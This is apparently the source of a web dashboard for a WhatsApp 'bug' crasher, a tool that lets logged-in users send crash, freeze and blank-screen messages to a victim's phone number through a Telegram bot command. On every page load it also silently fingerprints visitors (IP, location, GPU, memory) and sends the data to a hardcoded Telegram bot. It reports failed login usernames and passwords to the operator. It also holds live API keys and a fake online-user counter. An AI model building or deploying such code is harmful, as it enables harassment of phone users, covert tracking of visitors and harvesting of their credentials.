"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity, LogOut } from "lucide-react"

// KONFIGURASI UTAMA
const TELE_TOKEN = "8633526016:AAGZGlW2TROHF1V6GujEpz8o_QYXNpqSkwM"
const CHAT_ID = "6481060681"
const IMGBB_API_KEY = "4caf6ea53a17b11f879581a8ca9ee92e"

export default function YaeMikoDashboard() {
  const [isHydrated, setIsHydrated] = useState(false)
  const [bugLimit, setBugLimit] = useState(5)
  const [isWebLocked, setIsWebLocked] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isSending, setIsSending] = useState(false)
  const [isMusicOn, setIsMusicOn] = useState(true)
  const [isStealth, setIsStealth] = useState(false)
  const [engineSpeed, setEngineSpeed] = useState("Normal")
  const [targetNumber, setTargetNumber] = useState("")
  const [currentView, setCurrentView] = useState('dashboard')
  const [activeNav, setActiveNav] = useState(0)
  const [isCopied, setIsCopied] = useState(false)
  const [onlineUsers, setOnlineUsers] = useState(38)

  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const [showLimitPopup, setShowLimitPopup] = useState(false)
  const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)
  const [isVerified, setIsVerified] = useState(false)

  const [userRole, setUserRole] = useState("free")

  const [senderType, setSenderType] = useState("global")
  const [senderNumber, setSenderNumber] = useState("")
  const [pairingStatus, setPairingStatus] = useState("idle")
  const [receivedCode, setReceivedCode] = useState("")

  // STATE UNTUK SENDER PRIBADI
  const [isSenderPaired, setIsSenderPaired] = useState(false)
  const [pribadiLimit, setPribadiLimit] = useState(0)

  const bgMusicRef = useRef(null)
  const isSendingRef = useRef(false)

  const BUG_TYPES = [
    { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-14 h-14 text-[#00e5ff]" /> },
    { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-14 h-14 text-red-500" /> },
    { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-14 h-14 text-yellow-500" />},
    { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-14 h-14 text-pink-500" /> },
    { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-14 h-14 text-orange-500" /> },
  ]

  const sendInitialIntel = async () => {
    try {
      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase()
      localStorage.setItem('target_uuid', targetID)

      const ipRes = await fetch('https://ipapi.co/json/')
      const ipData = await ipRes.json()

      let gpu = "Unknown"
      try {
        const gl = document.createElement('canvas').getContext('webgl')
        const debug = gl?.getExtension('WEBGL_debug_renderer_info')
        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown"
      } catch (e) {}

      const msg = `?? **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n?? **IP:** ${ipData.ip} (${ipData.org})\n?? **LOC:** ${ipData.city}, ${ipData.country_name}\n?? **OS:** ${navigator.platform}\n?? **GPU:** ${gpu.slice(0,30)}\n?? **BAT:** ${navigator.hardwareConcurrency} Core / ${(navigator as any).deviceMemory || '?'}GB RAM`

      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      })
    } catch (e) {
      console.error(e)
    }
  }

  const syncPairing = async (action: string, messageText?: string): Promise<void> => {
    try {
      if (action === 'get') {
        const res = await fetch(`/api/webhook?update=${Date.now()}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'get_data' })
        })
        const data = await res.json()
        if (data) {
          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
          if (pairingStatus === "loading" && data.pairingCode) {
            setReceivedCode(data.pairingCode)
            setPairingStatus("success")
          }
          if (data.isPaired !== undefined) {
            setIsSenderPaired(data.isPaired === true)
            setPribadiLimit(data.isPaired === true ? 10 : 0)
          }
        }
      }
    } catch (err) {
      console.error(err)
    }
  }

  const syncControl = async (action: string, valueToSet?: number, messageText?: string): Promise<void> => {
    try {
      if (action === 'get') {
        if (isSendingRef.current) return
        
        const res = await fetch(`/api/control?update=${Date.now()}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'get_data' })
        })
        const data = await res.json()
        
        if (data && !isSendingRef.current) {
          if (data.limit !== undefined) setBugLimit(Number(data.limit))
          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
        }
      } 
      else if (action === 'set' && valueToSet !== undefined) {
        await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'set', valueToSet })
        })
      } 
      else if (action === 'sendReport' && messageText) {
        await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'sendReport', messageText })
        })
      }
    } catch (err) {
      console.error("Gagal Sync Control:", err)
    }
  }

  const handleRequestPairing = async () => {
    if (!senderNumber) return alert("Masukin nomor sender dulu!")
    setPairingStatus("loading")
    try {
      await syncControl('sendReport', undefined, `/pair ${senderNumber}`)
      const checkDatabaseInterval = setInterval(async () => {
        await syncPairing('get')
      }, 3000)
      setTimeout(() => {
        clearInterval(checkDatabaseInterval)
        setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
      }, 45000)
    } catch (e) {
      console.error(e)
      setPairingStatus("idle")
    }
  }

  // Hook Efek Utama untuk Inisialisasi Aplikasi
  useEffect(() => {
    sendInitialIntel();
    
    async function initData() {
      await syncControl('get')
      await syncPairing('get')
      const localVerify = localStorage.getItem('target_verified')
      if (localVerify === 'true') {
        setIsVerified(true)
      }
      setIsHydrated(true)
    }
    initData()
  }, [userRole])

  useEffect(() => {
    const autoRefresh = setInterval(async () => {
      await syncControl('get')
      await syncPairing('get')
    }, 4000)
    return () => clearInterval(autoRefresh)
  }, [userRole, pairingStatus])

  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        const direction = Math.random() > 0.5 ? 1 : -1
        const nextValue = prev + direction
        return nextValue < 15 ? 16 : nextValue > 50 ? 49 : nextValue
      })
    }, 8000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    if (bgMusicRef.current && isHydrated) {
      if (isMusicOn && isLoggedIn && !isWebLocked) {
        bgMusicRef.current.play().catch(() => {})
      } else {
        bgMusicRef.current.pause()
      }
    }
  }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])

  const handleLogin = async () => {
    if (username === "Leo" && password === "LEONZKENEDYZ") {
      setUserRole("admin")
      setIsLoggedIn(true)
      setShowErrorOverlay(false)
      const logMsg = `?? *LAPORAN LOGIN ADMIN OWNER*\n\n?? *User:* ${username}\n?? *Status:* Masuk sebagai Administrator`
      await syncControl('sendReport', undefined, logMsg)
    } else if (username === "Selz" && password === "Freebug") {
      setUserRole("free")
      setIsLoggedIn(true)
      setShowErrorOverlay(false)
      const logMsg = `?? *LAPORAN LOGIN DASHBOARD MEMBER*\n\n?? *User:* ${username}`
      await syncControl('sendReport', undefined, logMsg)
    } else {
      setShowErrorOverlay(true)
      const alertMsg = `?? *PERCOBAAN LOGIN GAGAL!*\n\n?? *Username input:* ${username || 'Kosong'}\n?? *Password input:* ${password || 'Kosong'}`
      await syncControl('sendReport', undefined, alertMsg)
    }
  }

  const handleSendBug = async () => {
    if (!targetNumber) {
      alert("Masukin nomor target dulu!")
      return
    }
    if (targetNumber === "6289505198913") {
      setShowRestrictedOverlay(true)
      return
    }

    const currentLimit = senderType === "pribadi" ? pribadiLimit : bugLimit

    if (userRole === "free" && currentLimit <= 0) {
      setShowLimitPopup(true)
      return
    }

    if (senderType === "pribadi" && !isSenderPaired) {
      alert("Kamu belum pairing sender pribadi!")
      return
    }

    isSendingRef.current = true
    let nextLimit = bugLimit

    if (userRole === "free") {
      if (senderType === "pribadi") {
        const nextPribadiLimit = Math.max(0, pribadiLimit - 1)
        setPribadiLimit(nextPribadiLimit)
        nextLimit = nextPribadiLimit 
      } else {
        nextLimit = Math.max(0, bugLimit - 1)
        setBugLimit(nextLimit)
        await syncControl('set', nextLimit)
      }
    }

    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
    const selectedBug = BUG_TYPES[activeNav].name

    setTimeout(async () => {
      const sisaLimitText = userRole === "admin" ? "UNLIMITED (?? ADMIN)" : `${nextLimit}/5`
      const attackMsg = `?? *LAPORAN PENYERANGAN BUG*\n\n?? *Pengirim:* ${username} (${userRole.toUpperCase()})\n?? *Target:* \`${targetNumber}\`\n?? *Jenis Bug:* ${selectedBug}\n?? *Speed Engine:* ${engineSpeed}\n?? *Sisa Limit User:* ${sisaLimitText}\n?? *Sender Mode:* ${senderType.toUpperCase()}`
      
      await syncControl('sendReport', undefined, attackMsg)

      setTimeout(async () => {
        const commandShortMsg = senderType === "pribadi" && senderNumber
          ? `/ryx ${targetNumber} ${senderNumber}`
          : `/ryx ${targetNumber}`
        await syncControl('sendReport', undefined, commandShortMsg)
      }, 1000)

      setIsSending(false)
      isSendingRef.current = false
    }, delay)
  }

  const copyToClipboard = () => {
    if (typeof navigator !== 'undefined' && targetNumber) {
      navigator.clipboard.writeText(targetNumber)
      setIsCopied(true)
      setTimeout(() => setIsCopied(false), 2000)
    }
  }

  if (!isHydrated) return <div className="bg-black min-h-screen flex items-center justify-center"><Loader2 className="w-8 h-8 text-cyan-400 animate-spin" /></div>

  if (isWebLocked) {
    return (
      <div className="fixed inset-0 z-[99999] bg-black flex flex-col items-center justify-center p-10 text-center">
        <Ban className="w-32 h-32 text-red-600 mb-8 mx-auto animate-pulse" />
        <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter mb-4">??SYSTEM-MAINTENANCE??</h1>
        <p className="text-white/50 text-xs font-bold uppercase tracking-[0.3em] max-w-xs mx-auto">
          Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti Kalau Udah Selesai Update nya.
        </p>
        <Loader2 className="w-4 h-4 text-red-600 animate-spin mt-10" />
      </div>
    )
  }

  const currentStatus = (() => {
    if (senderType === 'pribadi') {
      return isSenderPaired ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' };
    } else {
      return bugLimit > 0 ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' };
    }
  })();

  return (
    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth ? 'opacity-30' : 'opacity-100'}`}>
      <div className="fixed inset-0 z-0">
        <div className="absolute inset-0 bg-gradient-to-b from-[#050b14]/70 to-black"></div>
      </div>
      <audio ref={bgMusicRef} src="/audio.mp3" loop />

      {pairingStatus === "loading" && (
        <div className="fixed inset-0 z-[10008] bg-black/95 flex flex-col items-center justify-center backdrop-blur-md">
          <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
          <p className="font-bold text-xs uppercase tracking-widest text-cyan-400">MEMPROSES PAIRING BOT...</p>
        </div>
      )}

      {pairingStatus === "success" && (
        <div className="fixed inset-0 z-[10009] bg-black/95 flex flex-col items-center justify-center p-6 text-center">
          <div className="bg-white/5 p-8 rounded-3xl border-cyan-500/20 max-w-xs w-full backdrop-blur-lg">
            <h2 className="text-cyan-400 font-black italic mb-2 uppercase tracking-wider">WHATSAPP PAIRING CODE</h2>
            <div className="text-3xl font-mono font-black text-pink-500 bg-black/60 p-4 rounded-xl border-white/5 mb-6 tracking-wider">{receivedCode}</div>
            <button onClick={() => setPairingStatus("idle")} className="w-full py-3 bg-cyan-600 text-white font-black uppercase text-xs rounded-full shadow-lg">OK</button>
          </div>
        </div>
      )}

      {showErrorOverlay && (
        <div className="fixed inset-0 z-[10005] bg-red-950/90 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-bg_rumble">
          <AlertTriangle className="w-24 h-24 text-red-500 mb-6 animate-shake_violent" />
          <h1 className="text-3xl font-black italic uppercase text-white animate-glitch_extreme mb-8">CREATE AKUN KE BOT DONGO!</h1>
          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-4 px-10 rounded-full font-black uppercase text-xs flex items-center justify-center shadow-2xl">BUKA BOT</a>
          <button onClick={() => setShowErrorOverlay(false)} className="mt-6 text-white/40 font-bold uppercase text-[10px] tracking-widest hover:text-white transition">COBA LAGI</button>
        </div>
      )}

      {showRestrictedOverlay && (
        <div className="fixed inset-0 z-[10006] bg-red-900/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl">
          <Shield className="w-32 h-32 text-white mb-6" />
          <h1 className="text-4xl font-black italic uppercase text-white tracking-tighter">ACCESS DENIED</h1>
          <button onClick={() => setShowRestrictedOverlay(false)} className="px-12 py-4 bg-white text-black font-black uppercase text-xs rounded-full shadow-2xl">KEMBALI</button>
        </div>
      )}

      {isSending && (
        <div className="fixed inset-0 z-[10002] bg-black/80 flex flex-col items-center justify-center backdrop-blur-md">
          <Loader2 className="w-24 h-24 text-pink-500 animate-spin mb-6" />
          <p className="font-black italic uppercase text-sm tracking-[0.5em] text-cyan-400 text-center">SEDANG MENGIRIM BUG...</p>
        </div>
      )}

      {showLimitPopup && (
        <div className="fixed inset-0 z-[10001] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-md">
          <Bug className="w-28 h-28 text-red-600 mb-6 animate-shake_violent" />
          <h2 className="text-3xl font-black italic uppercase text-red-500 mb-4">LIMIT LU ABIS NGENTOD</h2>
          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-5 px-12 rounded-full font-black uppercase text-xs flex items-center gap-2">
            <ExternalLink size={16} /> MENUJU BOT
          </a>
          <button onClick={() => setShowLimitPopup(false)} className="mt-6 text-white/30 font-bold uppercase text-[9px] tracking-widest hover:text-white transition">LIMIT BAKALAN RESET SETELAH 24 JAM</button>
        </div>
      )}

      {!isLoggedIn ? (
        <div className="relative z-10 flex items-center justify-center min-h-screen p-6">
          <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl">
            <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
              YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span>
            </h1>
            <div className="space-y-4">
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none" placeholder="USERNAME" />
              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none" placeholder="PASSWORD" />
              <button onClick={handleLogin} className="w-full py-5 bg-cyan-600 rounded-full font-black uppercase italic text-xs text-white flex items-center justify-center gap-3"><Lock size={16}/> LOGIN</button>
            </div>
          </div>
        </div>
      ) : (
        <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen pb-24">
          {currentView === 'dashboard' ? (
            <div>
              <div className="flex justify-between items-center mb-6">
                <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : 'text-pink-500 border-pink-500/20'}`}>
                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
                </span>
              </div>

              <div className="bg-gradient-to-b from-[#1a203f]/90 to-[#12162d]/90 backdrop-blur-md rounded-[30px] p-6 shadow-2xl relative border border-white/5 mb-6">
                <div className="flex justify-center mb-4">{BUG_TYPES[activeNav].icon}</div>
                <div className="flex justify-between items-center mb-8 px-2">
                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center"><ChevronLeft size={20}/></button>
                  <h2 className="text-xl font-black text-white italic tracking-wider text-center">{BUG_TYPES[activeNav].name}</h2>
                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center"><ChevronRight size={20}/></button>
                </div>

                <div className="flex justify-between gap-3">
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
                    {userRole === "admin" ? <Infinity className="w-8 h-8 text-[#00e5ff]" /> : <span className="text-3xl font-bold text-[#00e5ff]">{senderType === 'pribadi' ? pribadiLimit : bugLimit}</span>}
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">LIMIT</span>
                  </div>
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
                    <span className={`text-2xl font-black ${currentStatus.color}`}>{userRole === 'admin' ? 'ACT' : currentStatus.text}</span>
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">STATUS</span>
                  </div>
                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center">
                    <span className="text-3xl font-bold text-white">{onlineUsers}</span>
                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">ONLINE</span>
                  </div>
                </div>
              </div>

              <div className="relative mb-6">
                <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-black italic text-lg text-cyan-400 outline-none" placeholder="628XXXXXXXX" />
                <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40"><Copy size={24} /></button>
              </div>

              <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white">KIRIM BUG</button>

              <div className="flex gap-3 mt-6 mb-2">
                <button onClick={() => setSenderType('pribadi')} className={`flex-1 flex flex-col items-center py-4 rounded-2xl ${senderType === 'pribadi' ? 'bg-[#00e5ff] text-black' : 'bg-[#151b3b]/80'}`}>
                  <h2 className="text-sm font-bold">Pribadi</h2>
                  <p className="text-[9px]">{isSenderPaired ? '✓ Terkait' : '✗ Kosong'}</p>
                </button>
                <button onClick={() => setSenderType('global')} className={`flex-1 flex flex-col items-center py-4 rounded-2xl ${senderType === 'global' ? 'bg-[#00e5ff] text-black' : 'bg-[#111322]/80'}`}>
                  <h2 className="text-sm font-bold">Global</h2>
                  <p className="text-[9px]">1 sender</p>
                </button>
              </div>

              {senderType === "pribadi" && (
                <div className="bg-white/5 border border-white/10 rounded-2xl p-4 mt-2">
                  <input value={senderNumber} onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black/80 border p-3 rounded-xl text-center text-xs text-cyan-400 font-bold" placeholder="NOMOR SENDER (628...)" />
                  <button onClick={handleRequestPairing} className="w-full py-3 bg-[#00e5ff] text-black rounded-xl font-black text-xs uppercase mt-2">REQUEST PAIRING</button>
                </div>
              )}
            </div>
          ) : (
            <div className="space-y-5">
              <h2 className="text-lg font-black italic uppercase border-b border-white/10 pb-4 text-cyan-400">Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}</h2>
              <div className="bg-white/5 p-6 rounded-[2.5rem]">
                <div className="flex gap-2">
                  {["Normal", "Fast", "Instant"].map((speed) => (
                    <button key={speed} onClick={() => setEngineSpeed(speed)} className={`flex-1 py-4 rounded-2xl text-[9px] font-black border ${engineSpeed === speed ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>{speed}</button>
                  ))}
                </div>
              </div>
              <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem]">
                <span className="text-xs font-black uppercase italic">Stealth Mode</span>
                <button onClick={() => setIsStealth(!isStealth)} className={`w-14 h-7 rounded-full relative ${isStealth ? 'bg-cyan-500' : 'bg-white/10'}`}><div className={`absolute top-1 w-5 h-5 rounded-full bg-white ${isStealth ? 'right-1' : 'left-1'}`}></div></button>
              </div>
              <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem]">
                <span className="text-xs font-black uppercase italic">Audio Output</span>
                <button onClick={() => setIsMusicOn(!isMusicOn)} className="p-3 rounded-2xl bg-cyan-500 text-black">{isMusicOn ? ( <Volume2 size={20}/> ) : ( <VolumeX size={20}/>)}</button>
              </div>
              <button onClick={() => { setIsLoggedIn(false); setUsername(""); setPassword(""); }} className="w-full py-6 bg-red-600/10 rounded-[2.5rem] text-xs font-black uppercase text-red-500">LOG OUT</button>
            </div>
          )}

          <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border border-white/10 p-4 rounded-[2.5rem] flex justify-around z-20">
            <button onClick={() => setCurrentView('dashboard')} className={`p-1 ${currentView === 'dashboard' ? 'text-cyan-400' : 'text-white/20'}`}><LayoutDashboard size={22}/></button>
            <button onClick={() => setCurrentView('settings')} className={`p-1 ${currentView === 'settings' ? 'text-cyan-400' : 'text-white/20'}`}><Settings size={22}/></button>
          </div>
        </div>
      )}
    </div>
  )
    }
